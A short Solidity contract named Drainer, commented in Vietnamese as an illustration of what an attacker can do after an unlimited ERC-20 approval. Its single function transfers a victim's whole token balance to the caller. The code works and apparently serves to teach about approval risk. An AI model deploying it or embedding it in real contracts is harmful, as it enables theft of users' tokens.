// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// Minh họa điều kẻ tấn công thật làm được sau một approve không giới hạn.
contract Drainer {
    function drain(IERC20 token, address victim) external {
        require(token.transferFrom(victim, msg.sender, token.balanceOf(victim)), "transfer failed");
    }
}